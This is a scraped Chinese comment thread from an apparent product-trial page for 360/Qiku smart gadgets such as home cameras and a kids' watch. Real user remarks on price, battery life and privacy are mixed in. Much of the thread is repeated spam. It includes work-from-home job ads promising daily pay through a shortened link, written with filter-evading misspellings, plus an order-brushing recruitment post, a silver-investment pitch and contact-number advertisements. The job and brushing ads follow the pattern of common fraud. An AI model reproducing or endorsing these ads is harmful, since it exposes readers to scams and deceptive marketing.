“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。  q44463425 微信请加。在线体验请加微信q44463425  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭 5o~15o， 我详细作讲解～ 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～ 
很不错 不知道什么时候能买到
积极申请，希望能争取到试用资格，对好的新奇产品积极推广！
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。  q44463425 微信请加。在线体验请加微信q44463425  
好期待什么效果！
要的就是智能手表
通过WIFI连入网络，考虑过安全性吗？
黑豆甘草茶 养肝、去毒、利湿、活血、养颜http://item.taobao.com/item.htm?id=38891673654
使用一周，感觉如下，1、电池电量在手机中提示不稳定，下午说快没电了，晚上说还剩5%，可是用到第三天上午彻底没电。2、电池待机时间不足，孩子上的的是寄宿幼儿园，电池只坚持了两天半，叫老师给充电好像太麻烦人家，干脆就停着呗。3、屏幕不够清晰，开背景灯光后更是惨。4、定位距离误差蛮大，可能与当地网络有关。5、录音时间太短，孩子语速比较慢。6、最好有视频。7、能通话更好。8、关机键是哪个？
不是很看好，电量消耗惊人，在没有电池革命性更新前，再多的花哨也抵挡不住消耗 
没有得到过一次体验机会唉。希望这次能给个机会吧。
最后给个赞，总的来说，是美好的尝试，希望改进能更好，想要市场买单，产品要更精致和强大。
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425    
免费的东东太难得到了，大海捞针啊、
关注中，，，，，，，
I like.
太贵了，新一代的电子产品不要太贵 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o，  我详细作讲解～  
之前购买的ithink的无线摄像机，感觉很不错，质感及功能算是领先，高清非常棒，真是防狼防盗防小三。http://detail.tmall.com/item.htm?id=38101267775分享给大家。
好酷好炫！！！
再问一下，手表防水么？没敢让孩子带下水。夏天会经常玩水。
再问一下，手表防水么？没敢让孩子带下水。夏天会经常玩水。
之前购买的ithink的无线摄像机，感觉很不错，质感及功能算是领先，高清非常棒，真是防狼防盗防小三。http://detail.tmall.com/item.htm?id=38101267775分享给大家。
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o，  我详细作讲解～  
问过孩子么？奖励小红花，为何不是红的？屏幕最好是彩色的，耶。
新兴的投资总会带给你不一样的收益，03年的网店，05的股市，09年的地产，通货膨胀的现在，你还在为满目琳琅的投资选择纠结吗？现货白银是你不二的选择-免费开户，免费指导。想了解的朋友回复联系我   QQ 2439218649   备注白银
虽然从没中过奖，但是仍不会失望！
介绍什么啊？说的一点都不祥细，是追踪个什么东西有什么用都没说。
希望 不要太贵 
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425  
好想体验一下 
希望有 360wifi的功能， 有无线和有线的优盘功能， 希望摄像头座部位置有 网络口子，路由器功能 希望摄像头座部位置有大些，有音响功能！ 希望摄像头座部位置有大些，重些，有充电宝功能，最少不低于20000m安以上，能连续放 无线蓝牙音响48小时以上。 希望以上功能都有，要创新，就创新的够劲，这样400元以上才值，没这些功能，就是卖劳动力，只能卖抢购价20元的货
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425  
这种双主桨的直升机要不得，抗风能力一点没有，风一吹就吹跑了。
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425  
好炫啊 好像要
屡败屡战，希望不断~
东东很不错！值得一用！
对此表示支持 
市场上已有很多相似产品，我家已在用上海产的。。。随时可看。 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～  每夭5o~15o， 我详细作讲解～  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425  
营销软件挂机兼职，200元/天。工资日结。 免费加入：http://99hometex.com/guaji//?dy21113 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
想要的估计都想试着用它来偷拍吧
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775   
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775   
超级赞，但是不知道要多少钱
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775  
～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
期待中，能和水滴摄像头一块上市吗！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！ 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
赞啊，不知道什么时候才能在中国上市
007装备！！！！！！！！！！！！ 
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775   
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775 前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
我们是监控摄像机厂家直销。有需要加QQ597510628
智能时代的超前体验！很想拥有！
我是做检测认证的。360开发的这款产品的确很人性化。集很多功能为一体，神器一款。18300040990
～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～  每夭5o~15o， 我详细作讲解～  
挺关注这个的，希望自己能选中，对异常情况等进行处理等非常方便，最起码不会出现大事情，第一时间对家人进行告之，但是他能不能对家中的的一切情况进行拍摄存储，这就是另外一回事了。
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775   
不要卖的太贵啊
不知道中国能买不能
绝对赞一个 好棒啊
这个不错，可以由
期待可以掉在房顶上当监控来用，如果可以的话以后家里防盗就选你了
～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425  
～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o，  我详细作讲解～  
求试用 求试用
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425  
求试用求试用
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 q44463425 微信请加。在线体验请加微信q44463425  
如果早点出我的钱包就不会丢了    360要负责
小小建议，可以通过手机控制：主体可以360度旋转，摄像头可以上下旋转的，前提是小水滴带这个功能。方便观察房间，视线更广阔。
不想试用，赶紧上市，我想买
这是好东西。监控
挺关注这个的，希望自己能选中，对异常情况等进行处理等非常方便，最起码不会出现大事情，第一时间对家人进行告之，很看好它。但是它能不能对家中的的一切情况进行拍摄存储，这就是另外一回事了
想得到一个向同事炫耀一下
这个创意好像会不会鸡肋啊？
～ ～不限制工作时间，做的越多  挣的越多～～（宝妈、学生、上班族都可以） ～每夭5o~15o，我详细作讲解～  有意者博客联系我  http://t.cn/8sfyr3p 
～不限制工作时间，做的越多  挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到   浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
居然被选中了！！开心！！！
～不限制工作时间，做的越多  挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到   浏览器打开 ～即可报名咨询 ～每夭 5o~15o，我详细作讲解～
好想要啊........
要是摔下来...怎么办...或者手机卡住了...
免费！免费！
非常喜欢奇酷网的东西！很新奇，也很有趣，希望能够抽中我！
介绍可以再吸引人一点，光是外表是不足以吸引人去关注的吧~
可惜手机是4.2的.............
有想做兼职的朋友可以联系我•• 用空余的时间找份事做，时间自由，日结工结，每天50~120不等，多劳多得，本兼职适合：全职妈妈，在校大学生，办公室文员及平时有空闲时间的朋友，拍单过程中无需垫付任何一分钱，也欢迎淘宝的卖家来放单！有兴趣的朋友可以加我QQ 2120380634了解 
我很认真的写了自己使用过了类似产品的感受，以及对现状的不满和期望。对于出的题目，智能手环对生活的改变我还真没说什么。然后中标了
有想做兼职的朋友可以联系我•• 用空余的时间找份事做，时间自由，日结工结，每天50~120不等，多劳多得，本兼职适合：全职妈妈，在校大学生，办公室文员及平时有空闲时间的朋友，拍单过程中无需垫付任何一分钱，也欢迎淘宝的卖家来放单！有兴趣的朋友可以加我QQ 212038 0634了解 
有想做兼职的朋友可以联系我•• 用空余的时间找份事做，时间自由，日结工结，每天50~120不等，多劳多得，本兼职适合：全职妈妈，在校大学生，办公室文员及平时有空闲时间的朋友，拍单过程中无需垫付任何一分钱，也欢迎淘宝的卖家来放单！有兴趣的朋友可以加我QQ 2120380634了解 
宝妈，办公室职员，学生，宅男宅女都可以来做，曰收40-100左右，薪水曰结，有意者博客联系我 【 http://t.cn/8sfyr3p】我详细作讲解～
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】 ～ ～每夭5o~15o，我详细作讲解～
我想知道魅族手机匹配这个吗？
查外遇专用嘛（*△*），有此神器，妈妈再也不用担心我把女童鞋带回家了@︿#
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】 ～ ～每夭5o~15o，我详细作讲解～  不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】 ～ ～每夭5o~15o，我详细作讲解～   
我想说的是，我们家就有着类似的产品，可以对家中的的一切情况进行拍摄存储，配合门磁，烟感，汽感还有报警功能！摄像头可以上下旋转120度，左右旋转355度，联动报警网络摄像机，有需要了解的可以来电咨询谢谢 13266559186
希望价格能够让我们异地恋刚上班的小伙子们接受。真心希望能有一台这样的360卫士。
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】 ～每夭5o~15o，我详细作讲解～  不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】 ～ 每夭5o~15o，我详细作讲解～
很好，也让我享受一下监控的感觉。
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】 每夭5o~15o，我详细作讲解～ 不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】 每夭5o~15o，我详细作讲解～
虽说是免费，还要写报告！唉~愁死了···
我喜欢奇酷网的东西，我要的东西它都有，我希望他能抽中我！！！谢谢！
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～ 不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～
最关心有没有开关啊
感觉不安全，要被人黑了，网上又不知要多多少门。只要一个摄像头被黑，其它摄像头都可能被入侵。。。。。。想要的最好找360好好了解下安全防护，别到时被人监控还不知
小偷太狂了，真想搞个试试
一年到头都出差在外，想念家人担心家人的时候总是希望能看看她娘俩。而且笨老婆不会做饭，经常也照顾不好自己，有些时候懒得出去吃也就随便弄些东西下肚，有这个我就算在外面也可以在她做饭的时候教着她该怎么做了。而且说实话，老婆孩子孤零零在家真的让人很不放心，家里出点事啥的不怕一万就怕万一，如果能附加一个烟火和煤气之类的感应报警元件就更好了.....
很赞 值得拥有
哇 好酷啊
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～ 不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～ 
好牛啊 手机控制
这个类似的产品我也有销售，我卖的是台湾品牌Yescam,有兴趣的朋友请电话联系13822619599
非常好的东西，考虑的非常周到，希望以后更好。
每次都申请试用，但是每次都没有被抽中，希望这次能够抽中让我感受下360智能产品的魅力
期待你的上市 
兄弟，你好！看见你说的这些！我公司的一款产品能达到您所说的要，可以双向语音对讲，无线连接，门磁、烟感、汽感、红外探头！这些都是可以的！有需要的话，可以了解一下！谢谢
很想体验高科技带来的生活乐趣希望能给机会抽中！
买 的是牌子？ 
给我一次中签的机会吧。。。。。
不就是试用报告吗？ 我也希望360公司抽到我
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～ 
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～ 
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o， 我详细作讲解～ 
好像得到试用机会，试试这个人性化的神器
很好，很有发展的余地！支持一下@！
哈哈，不错，一定要买回家，
呵呵..   sb.
产品很好很贴心，受到大家的热捧是必然的，希望360能耐心听取大家的建议，不断完善它，使它发挥出更好更大的作用，并且最终走进千家万户。
太贵了·~~
我是360忠实粉丝.希望我能被抽到~
哈哈哈，我抽中了好好用，谢谢360了 
好像像电视剧里面的那样视频对话啊
好哇塞好哇塞啊
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～ 
真的很希望很希望    能够使用到    康桑思密达
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～ 
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～ 
能用手机设置转向吗？
希望出来，这样就可以买了。。。。。。。。
这款产品太好了真想得到。
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～  
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～  
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～  
好玩啊，买了一个，就是内存站的有点多
确实很好用，省了大把时间，还很好玩，是个好东西，赞一个
360卫士 非常出色 手机 电脑都在用360的，加油 我们看好你 
I like this
希望能给我用用
希望可以早点出来 
能联网就更好了
厉害啊。。。
舍不得切呀，150美元（约合人民币940元）一切切没了
居然被选中了，不过凭借着我这个电子发烧友的身份，不被选中才是怪事 
坐等16G版
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～  
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～  
坐等16G版
360很为用户着想
价格也太贵了
小哥你还不如，加313元买一个有闪光灯的手机。
水涨船高。关注的人多了。就漫天要价了！
很不错的感觉
好像有些笨重
不需要和PC连接吗？很不错啊。
好希望弄给我一个啊~~我从来没试过内~~~
真帅啊，太想拥有了
神奇啊神器啊
很不错的一个为用户着想的东西，我也希望我能够中签 
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～ 
不限制工作时间，做的越多挣的越多～【http://t.cn/8sfyr3p】每夭5o~15o，我详细作讲解～ 
有意者请博客联系我【 http://t.cn/8sfyr3p】复制到地址栏打开。要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。
哇 这么好 图片设计很好啊
http://www.pozible.com/project/183268这里面哟详细介绍！手机下载APP就可以和乐测智能体温贴相连接进行操控了。安卓手机后续会陆续适配的。谢谢您的关注！
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
360用户实际体验缺点： 1.发热太厉害，总担心把储存晶片烧掉，不敢放重要文件。 2.在插入即插即用的设备（如随身音响）时U盘功能无效。 3.U盘并不高速，很普通，内存小，可选性不强，估计是因为360怕亏。 4.穿墙性能很普通。
这玩意高大上啊
你拍的很好 你是拍摄专业是吗 
求中箭 呜呼~ 其真无马耶？
最好有简易的录音功能，可以自己录制喜欢的提示音
帅啊啊啊啊
我希望我能通过 通过我会好好感激的 
哇，看起来肯定有意思
笔记本电脑自己就可以开WIFE。但是我关心的是台式电脑可以用这个开WIFE吗？
必须顶啊~~
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
最好能配一块太阳能板，毕竟提倡环保嘛，而且可以设计成可双人或者多人连接那种就更好了，就类似于，一对情侣，都有这款鞋子，他们就可以抱着一起走了
什么时候可以购买？
不错啊，蛮好的
360开发的软件或者是产品都非常实用，价格适中，之前买了360无线WIFI一直在用，推荐了很多给朋友和同事，期待推出好的产品，我会支持的嘻嘻！
当时是一口气抢了5个，每个ID限10个。在那之后360天猫旗舰店基本上都显示有货，现在也有，货源江苏。不谢。
网络连接问题还有待解决，最好可以连接移动或联通等通信公司的wlan之类的网络。
希望能抽到我啊，呵呵 
并且还是一个很好的的产品 双向通话 太完美了 good
我不会告诉你我用手机抢了5个。
从开始买电脑开始就装上了360的产品，五年了 现在越用越顺，手机，平板都是360卫士。看好360，相信这个产品也会给我想不到的惊喜
这个室外的最好配上一块太阳能或者手摇式的充电器，因为在室外野营用的话电是一个问题
不错，为懒人设计的
http://item.taobao.com/item.htm?spm=a1z10.3.w4002-7773127244.22.pNe0Hv&amp;id=39899383542     【厂家 包邮】即插即用 无线网络摄像机 双向语音、WIFI、SD卡 正 支持手机远程监控，兼容各种智能手机、平板电脑等远程监控现场，随时拿起手机一点即 支持插卡功能，最大兼容32G内存卡，用于视频和照片的存储；
不错的设计啊
360 我一直信任你！
终于出门不怕迷路啦 远程快门很好 希望下一代的产品能支持投放 用户可以看着屏幕来开 也可以用语音 并且低端蓝牙的版本也可以支持 让这个企业生受用户的喜爱 
一直都支持360！希望可以申请成功！
我的意思是在高德小蜜上 而不是在手机端 
即使家里需要连WIFI也很爽啊  
一直支持360！！！保佑申请成功啊！！！
高端大气上档次的一款新产品，只看外表就很吸引人，功能也是很强大的，希望360多多听听大家的意见与反馈，不断的完善与改进，让此产品做得更加完美，走进千家万户。永远支持360！！！
以前成功抢购360路由器，用着非常好，我电脑里全是用的360的产品！支持
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
即然蓝牙了，哪么是不是可以直接用来接电话呢？
sony不是也有nfc的蓝牙吗 
sll，wzxyt，xwsqcg！~ 
这个搞的太复杂了，在早几年以前就有卖小朋友穿的哪种脚后跟带轮子的鞋了，这个只是用了电！创新不是很大！
功能太花，基本上现在类似的产品都是这样的功能，价格还哪么高难道花这么多钱，只是表示我去年买了个表？
上次99元抢了一个，有几个月了，没发现缺点。
永远支持360！！！360的产品又好用又安全而且很贴心！360我们永远都支持你！
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
现在定时的到处卖，你这个还要微信控制，也许你是觉得这样可以更好的设置，其实，这就是画蛇添足！
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
一直申请奇酷的产品，但是一直没成功，希望这次成功
360一直支持你的我！希望能申请成功！
一直使用360，还推荐同学一起用
个人感觉，类似的产品，其实用定时就足可以控制了，没必要再搞一个手机APP来，或许这是给哪种什么都不放心，出门以后这忘哪忘的人准备的吧！
我是个钓鱼爱好者，每次钓鱼的时候都会花上好一会时间用诱饵来引鱼。自从FishHunter Sonar团队发明了智能捕鱼器，我再也不用为找鱼窝而发愁了。如果我能得到这款智能捕鱼器那是再好不过了。
很好的产品，
支持360安全卫士。
这个看起来很好，但是，就支持的手机来说，用不了，只能看看了！
永远支持360！！！360的产品又好用又安全而且很贴心！360我们永远都支持你！  一直申请奇酷的产品，但是一直没成功，希望这次成功    高端大气上档次的一款新产品，只看外表就很吸引人，功能也是很强大的，希望360多多听听大家的意见与反馈，不断的完善与改进，让此产品做得更加完美，走进千家万户。永远支持360！！！
这东西，放在这里太不合群了吧，这样的产品老外n多年以前就做出来了，现在在国内是成龙代理的！赛格威！现在警察用的都是这个牌子的！国内还有新日，前年都有了。这车子，我们这大街上到处都是卖的！
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
第一次申请，希望能成功。
我感觉这产品就是为我定做的，爱死了
好强大，如果可以远程遥控那就更没了！！
这个是好东西啊，据说，打印手机的就是这种机器吧？
买不到。如果在京东那烂网更抢不到。
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
你呀的。。我刚试了一下，我家笔记本ctrl两下也可以打开360搜索啊！！！！
我依旧还是变遗忘的那个 -.-
呵呵十分激动、开心。
永远支持奇虎
一直在用360   永远都用360的产品   万万个支持
一直都在使用360，希望这次可以申请成功！
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解 ～  
我也想要~~
360产品用了360WIFI，一直用的不错，这次看了这么好的东西，一定要试用，希望这次可以申请成功！
帅气，简约，适合上午认识或者白领。其实都适合。。。 自己也想拥有一个~
谁说台式机不能用的,既然笔记本电脑能用,台式机也能用
支持360卫士！
这次看了这么好的东西，一定要试用，希望这次可以申请成功！ 
支持360卫士！
一直都在使用360，希望这次可以申请成功！ 
感觉太实用了
永远支持奇虎 
第一次申请，希望能成功。
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解 ～  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解 ～  
中箭吧 。为了孩子
我自己会设置，用免费软件，只要有移动的任何物体都能发照片给我，免费。
360 无与伦比的强大！毫无保留的支持！！
得实用  太虚的就算了
行吧，，市场前景不大
如果能将虚拟现实技术加入进去，虚拟实现画面效果，将会有更广阔的发展空间，甚至可以取代手机，平板等等等等……
这得多少钱，我们也许只能可望而不可即喽！
支持，希望尽快能见到实物
最好可以360度旋转改变方向，这样就强大了！ 
360打到一切其他软件
发热太厉害啊
已经发表了我的看点，对360全面安全全面关怀这个是社会人类进步的产品必须支持到底。
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解 ～  
360等级即将迈入25级，游戏只玩360，电脑保护360，浏览器360，随身wifi360，忠诚度不容质疑，第一次看到试用，果断申请， 支持360，愿360明天会更好。
免费试用？是真是假？如果功能没有说的那么好，可不可以不要？
配合电脑来电开机的设置，这就一电脑棒啊，向日葵什么的电脑棒完全不需要了啊，就是个人感觉稍稍有点贵了，功能还是挺不错的！想象一下，在家里总开关处安装一个，设置定时打开，打开家里的路由启动就有网了，用APP连上，下班前就可以吧家里的空调家里降下温，通过来电开机功能可以把电脑打开，向日葵远程控制电脑把电视电影缓冲上，老旧的半自动热水器开始热水，马上到门口了，电灯开启。尼玛，智能时代不远了！360大赞！顶
非常想知道效果
草啊  高科技啊  牛啊
撞到鸟怎么办
这个  很喜欢 ！！真想拥有！
我手机老是忘了放在哪里都，每次都要着好久，还弄掉了3部手机，强力推荐  快出吧
真心不错！
好东西·神器永远支持360
最近家门口总有没事找事的几个敲门的，觉得孩子在家太不安全了，想要一个随时监控安全情况
感觉效果不错啊，就是不知道价格怎啊，最喜欢报警的功能了，估计能做监控啊，哈哈太期待了！！！！
电视不清楚，电脑可以设置来电开机，现在的主板都有这功能，开机自启动远程控制，向日葵之类就可以远程控制家里的电脑了，空调有来电自动运行啊，默认到26度，电饭煲之前把米泡上按下开关，来电就煮上了啊，算好时间到家就行了啊
等看看如果效果好考虑买一个！！http://klitong.taobao.com/淘宝流行鞋店欢迎你哦！
不错 支持下！！
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
配合小K，，，，这无敌啊
我庆幸我们赶上好时候，能有这样的高科技在我们身边。。。。。。
感觉不错，看到介绍就很期待啊，报警功能最好了，不知道实际效果怎啊！！！！！！！！！
会丢的，中国外面没人看着的东西都是无主的，看着的都回丢，别说这放开的
我在论坛看到过网友的试用报告还有到货以后的到货单、包装和实物照片，是真的可能性很大。而且就算是有伪，申请使用也没有让我们花一份钱，填填也不亏呗，假如被选中了呢？反正偶是这么想的（因为我之前因参与360云盘活动获得过抱枕所以个人比较相信）
